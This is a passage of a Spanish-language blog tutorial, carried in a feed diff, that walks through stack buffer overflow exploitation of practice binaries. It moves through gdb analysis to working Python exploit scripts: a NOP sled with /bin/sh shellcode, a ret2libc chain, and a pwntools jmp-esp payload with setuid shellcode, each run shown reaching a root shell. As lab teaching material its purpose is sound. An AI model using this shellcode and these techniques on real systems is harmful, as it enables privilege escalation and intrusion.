-0xffffd3a0:	0xffffdeca	0xffffdee8	0xffffdef0	0xffffdf16
-0xffffd3b0:	0xffffdf3f	0xffffdf54	0xffffdf5f	0xffffdf67
-0xffffd3c0:	0xffffdf87	0xffffdfb6	0xffffdfbf	0x00000000
-0xffffd3d0:	0x00000020	0xf7fc8570	0x00000021	0xf7fc8000
-0xffffd3e0:	0x00000033	0x00000e30	0x00000010	0x0f8bfbff
-0xffffd3f0:	0x00000006	0x00001000	0x00000011	0x00000064
-0xffffd400:	0x00000003	0x56555034	0x00000004	0x00000020
-0xffffd410:	0x00000005	0x0000000b	0x00000007	0xf7fca000
-0xffffd420:	0x00000008	0x00000000	0x00000009	0x56556090
-0xffffd430:	0x0000000b	0x00000000	0x0000000c	0x00000000
-0xffffd440:	0x0000000d	0x00000000	0x0000000e	0x00000000
-0xffffd450:	0x00000017	0x00000000	0x00000019	0xffffd49b
-0xffffd460:	0x0000001a	0x00000002	0x0000001f	0xffffdfcb
-0xffffd470:	0x0000000f	0xffffd4ab	0x0000001b	0x0000001c
-0xffffd480:	0x0000001c	0x00000020	0x00000000	0x00000000
-0xffffd490:	0x00000000	0x00000000	0x29000000	0xf4d13484
-0xffffd4a0:	0xe3943ad4	0xa212ba18	0x6939ccce	0x00363836
-0xffffd4b0:	0x00000000	0x00000000	0x00000000	0x6d6f682f
-0xffffd4c0:	0x696d2f65	0x6c657567	0x6174532f	0x764f6b63
-0xffffd4d0:	0x6c667265	0x6c2f776f	0x6c657665	0x656c2f73
-0xffffd4e0:	0x546c6576	0x65657268	0x90909000	0x90909090
-0xffffd4f0:	0x90909090	0x90909090	0x90909090	0x90909090
-0xffffd500:	0x90909090	0x90909090	0x90909090	0x90909090
-0xffffd510:	0x90909090	0x90909090	0x90909090	0x90909090
-0xffffd520:	0x90909090	0x90909090	0x90909090	0x90909090
-0xffffd530:	0x90909090	0x90909090	0x90909090	0x90909090
-0xffffd540:	0x90909090	0x90909090	0x90909090	0x90909090
-0xffffd550:	0x90909090	0x90909090	0x90909090	0x90909090
-0xffffd560:	0x90909090	0x90909090	0x90909090	0x90909090
-0xffffd570:	0x90909090	0x90909090	0x90909090	0x90909090
-0xffffd580:	0x90909090	0x90909090	0x90909090	0x90909090
-0xffffd590:	0x90909090	0x90909090	0x90909090	0x90909090
-0xffffd5a0:	0x90909090	0x90909090	0x90909090	0x90909090
-0xffffd5b0:	0x90909090	0x90909090	0x90909090	0x90909090
-0xffffd5c0:	0x90909090	0x90909090	0x90909090	0x90909090
-0xffffd5d0:	0x90909090	0x90909090	0x90909090	0x90909090
-0xffffd5e0:	0x99580b6a	0x2f2f6852	0x2f686873	0x896e6962
-0xffffd5f0:	0xcdc931e3	0x42424280	0x4f430042	0x54524f4c
-0xffffd600:	0x3d4d5245	0x65757274	0x6f6c6f63	0x49440072
-0xffffd610:	0x414c5053	0x303a3d59	0x4e414c00	0x2e433d47
-0xffffd620:	0x2d465455	0x41500038	0x2f3d4854	0x2f727375
-0xffffd630:	0x61636f6c	0x62732f6c	0x2f3a6e69	0x2f727375
-0xffffd640:	0x61636f6c	0x69622f6c	0x752f3a6e	0x732f7273
-0xffffd650:	0x3a6e6962	0x7273752f	0x6e69622f	0x62732f3a
-0xffffd660:	0x2f3a6e69	0x3a6e6962	0x7273752f	0x636f6c2f
-0xffffd670:	0x672f6c61	0x73656d61	0x73752f3a	0x61672f72
-0xffffd680:	0x0073656d	0x4d524554	0x616c613d	0x74697263
-0xffffd690:	0x58007974	0x48545541	0x5449524f	0x682f3d59
-0xffffd6a0:	0x2f656d6f	0x7567696d	0x2e2f6c65	0x74756158
-0xffffd6b0:	0x69726f68	0x58007974	0x435f4744	0x45525255
-0xffffd6c0:	0x445f544e	0x544b5345	0x693d504f	0x534c0033
-0xffffd6d0:	0x4c4f435f	0x3d53524f	0x303d7372	0x3d69643a
-0xffffd6e0:	0x333b3130	0x6e6c3a34	0x3b31303d	0x6d3a3633
-gdb-peda<span class="err">$</span>
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Bueno vamos a tomar una dirección que contengo solo <code class="language-plaintext highlighter-rouge">nops</code> que es la esta mas repetida en este caso seria esta que yo elegí <code class="language-plaintext highlighter-rouge">0xffffd520:0x90909090</code>.</p>
-  </li>
-  <li>
-    <p><strong>Junk</strong> contiene una secuencia de caracteres <code class="language-plaintext highlighter-rouge">\x90</code> que, en hexadecimal, equivale a <code class="language-plaintext highlighter-rouge">0x90</code>, que es una sola instrucción <code class="language-plaintext highlighter-rouge">NOP</code>.</p>
-  </li>
-  <li>
-    <p>De igual forma estamos en <code class="language-plaintext highlighter-rouge">little endian</code> así que vamos a darle la vuelta.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xffffd530    | <span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>d5<span class="se">\x</span>30     | <span class="se">\x</span>30<span class="se">\x</span>d5<span class="se">\x</span>ff<span class="se">\x</span>ff
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora lo que vamos a hacer es cambiar los 4 B que habías puesto por la dirección en los <code class="language-plaintext highlighter-rouge">nops</code> esto para que los <code class="language-plaintext highlighter-rouge">nops</code> se desplacen en la pila asta llegar al <code class="language-plaintext highlighter-rouge">shellcode</code> y se ejecute.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>otro.py
-<span class="c">#!/usr/bin/python2</span>
-<span class="c"># -*- coding: utf-8 -*-</span>
-
-offset <span class="o">=</span> 268  <span class="c"># En el shellcode son las instrucciones maliciosas</span>
-
-shellcode  <span class="o">=</span> b<span class="s2">""</span>
-shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
-shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
-shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
-
-<span class="c"># x90 representa la instrucción "NOP" en lenguaje de máquina</span>
-junk <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">90"</span> <span class="k">*</span> <span class="o">(</span>offset - len<span class="o">(</span>shellcode<span class="o">))</span>
-
-<span class="c"># Usamos la dirección deseada en little endian</span>
-eip <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">d5</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff"</span>
-
-<span class="c"># Salida del payload completo</span>
-print<span class="o">(</span>junk + shellcode + eip<span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora lo ejecutamos.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelThree <span class="si">$(</span>python2 otro.py<span class="si">)</span>
-Buf: j
-      XRh//shh/bin��0�
-<span class="c"># whoami</span>
-root
-</code></pre></div></div>
-
-<h2 id="ret2libc">Ret2libc</h2>
-
-<ul>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">Ret2libc</code>, abreviatura de “<code class="language-plaintext highlighter-rouge">return-to-libc</code>”, es una técnica clásica de explotación utilizada para eludir medidas de seguridad que previenen la ejecución de código inyectado, como las protecciones contra ejecución en la pila (<code class="language-plaintext highlighter-rouge">stack</code>). Esta técnica implica manipular la pila de llamadas de un programa vulnerable para hacer que ejecute funciones ya presentes en la biblioteca <code class="language-plaintext highlighter-rouge">libc</code>, como <code class="language-plaintext highlighter-rouge">system()</code>, que puede ejecutar comandos de <code class="language-plaintext highlighter-rouge">shell</code>.</p>
-  </li>
-  <li>
-    <p>Vamos analizar el código.</p>
-  </li>
-  <li>
-    <p>Esta es la función main.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/vulnhub/buff/ret.png" />
-</p>
-
-<ul>
-  <li>Esta es la función <code class="language-plaintext highlighter-rouge">overflow</code> y vemos que le esta dando 20 bytes de tamaño al buffer.</li>
-</ul>
-
-<p align="center">
-<img src="/assets/vulnhub/buff/ret1.png" />
-</p>
-
-<ul>
-  <li>
-    <p>El problema de ahora es que no podemos correr el <code class="language-plaintext highlighter-rouge">shellcode</code> de antes por que mide mas del buffer asignado.</p>
-  </li>
-  <li>
-    <p>Comenzamos enviado 50 bytes.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels gdb <span class="nt">-q</span> levelFour
-Reading symbols from levelFour...
-<span class="o">(</span>No debugging symbols found <span class="k">in </span>levelFour<span class="o">)</span>
-gdb-peda<span class="nv">$ </span>pattern_arg 50
-Set 1 arguments to program
-gdb-peda<span class="nv">$ </span>run
-Starting program: /home/miguel/StackOverflow/levels/levelFour <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'</span>
-<span class="o">[</span>Thread debugging using libthread_db enabled]
-Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
-Buf: AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbA
-
-Program received signal SIGSEGV, Segmentation fault.
-Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
-Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>
-
-Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
-Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
-<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
-EAX: 0x38 <span class="o">(</span><span class="s1">'8'</span><span class="o">)</span>
-EBX: 0x41412d41 <span class="o">(</span><span class="s1">'A-AA'</span><span class="o">)</span>
-ECX: 0xffffcf4c <span class="nt">--</span><span class="o">&gt;</span> 0x48d58600
-EDX: 0x1
-ESI: 0xffffd010 <span class="nt">--</span><span class="o">&gt;</span> 0x2
-EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
-EBP: 0x44414128 <span class="o">(</span><span class="s1">'(AAD'</span><span class="o">)</span>
-ESP: 0xffffcfc0 <span class="o">(</span><span class="s2">"A)AAEAAaAA0AAFAAbA"</span><span class="o">)</span>
-EIP: 0x413b4141 <span class="o">(</span><span class="s1">'AA;A'</span><span class="o">)</span>
-EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
-<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
-Invalid <span class="nv">$PC</span> address: 0x413b4141
-<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
-0000| 0xffffcfc0 <span class="o">(</span><span class="s2">"A)AAEAAaAA0AAFAAbA"</span><span class="o">)</span>
-0004| 0xffffcfc4 <span class="o">(</span><span class="s2">"EAAaAA0AAFAAbA"</span><span class="o">)</span>
-0008| 0xffffcfc8 <span class="o">(</span><span class="s2">"AA0AAFAAbA"</span><span class="o">)</span>
-0012| 0xffffcfcc <span class="o">(</span><span class="s2">"AFAAbA"</span><span class="o">)</span>
-0016| 0xffffcfd0 <span class="nt">--</span><span class="o">&gt;</span> 0x4162 <span class="o">(</span><span class="s1">'bA'</span><span class="o">)</span>
-0020| 0xffffcfd4 <span class="nt">--</span><span class="o">&gt;</span> 0x0
-0024| 0xffffcfd8 <span class="nt">--</span><span class="o">&gt;</span> 0x13
-0028| 0xffffcfdc <span class="nt">--</span><span class="o">&gt;</span> 0x3e8
-<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
-Legend: code, data, rodata, value
-Stopped reason: SIGSEGV
-0x413b4141 <span class="k">in</span> ?? <span class="o">()</span>
-gdb-peda<span class="err">$</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a ver el <code class="language-plaintext highlighter-rouge">offset</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x413b4141
-1094402369 found at offset: 28
-</code></pre></div></div>
-
-<ul>
-  <li>En este tipo de explotaciones tenemos que saber la dirección de la función <code class="language-plaintext highlighter-rouge">system</code> y <code class="language-plaintext highlighter-rouge">exit</code> ya que son funciones de <code class="language-plaintext highlighter-rouge">libc</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>p system
-<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7c4c870 &lt;system&gt;
-gdb-peda<span class="err">$</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora la dirección de <code class="language-plaintext highlighter-rouge">exit</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>p <span class="nb">exit</span>
-<span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7c3c130 &lt;<span class="nb">exit</span><span class="o">&gt;</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora vamos a ver la dirección de <code class="language-plaintext highlighter-rouge">/bin/sh</code> de <code class="language-plaintext highlighter-rouge">libc</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>find /bin/sh
-Searching <span class="k">for</span> <span class="s1">'/bin/sh'</span> <span class="k">in</span>: None ranges
-Found 1 results, display max 1 items:
-libc.so.6 : 0xf7db5fc8 <span class="o">(</span><span class="s2">"/bin/sh"</span><span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Estamos en <code class="language-plaintext highlighter-rouge">little endian</code> entonces tenemos que darle la vuelta a todas las direcciones.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xf7c4c870    |   <span class="se">\x</span>f7<span class="se">\x</span>c4<span class="se">\x</span>c8<span class="se">\x</span>70
-0xf7c3c130    |   <span class="se">\x</span>f7<span class="se">\x</span>c3<span class="se">\x</span>c1<span class="se">\x</span>30
-0xf7db5fc8    |   <span class="se">\x</span>f7<span class="se">\x</span>db<span class="se">\x</span>5f<span class="se">\x</span>c8
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora definimos el script.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>levelFour.py
-<span class="c">#!/usr/bin/python2</span>
-
-offset <span class="o">=</span> 28
-
-junk <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> offset
-
-addr_system <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">c4</span><span class="se">\x</span><span class="s2">f7"</span>
-addr_exit <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">f7"</span>
-addr_bin_sh <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">f7"</span> <span class="c"># aqui es donde llamamos a /bin/bash para que nos de una shell</span>
-
-print<span class="o">(</span>junk + addr_system + addr_exit + addr_bin_sh<span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Lo ejecutamos.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelFour <span class="si">$(</span>python2 levelFour.py<span class="si">)</span>
-Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAp�0���
-<span class="c"># whoami</span>
-root
-</code></pre></div></div>
-
-<h2 id="level-5">Level 5</h2>
-
-<ul>
-  <li>Gracias a xchg2pwn por la aportación <a href="https://xchg2pwn.github.io">https://xchg2pwn.github.io</a>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python2</span>
-from pwn import process, p32
-
-shell <span class="o">=</span> process<span class="o">(</span><span class="s2">"./levelFive"</span><span class="o">)</span>
-
-offset <span class="o">=</span> 16
-junk <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> offset
-
-jmpesp <span class="o">=</span> p32<span class="o">(</span>0xf7dd4ff7<span class="o">)</span>
-
-setuid <span class="o">=</span> b<span class="s2">"1</span><span class="se">\x</span><span class="s2">dbj</span><span class="se">\x</span><span class="s2">17X</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
-
-shellcode  <span class="o">=</span> b<span class="s2">""</span>
-shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
-shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
-shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
-
-shell.sendline<span class="o">(</span>junk + jmpesp + setuid + shellcode<span class="o">)</span>
-shell.interactive<span class="o">()</span>
-</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="vulnhub/machines" /><summary type="html"><![CDATA[]]></summary></entry></feed>
+</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/insane" /><summary type="html"><![CDATA[]]></summary></entry></feed>
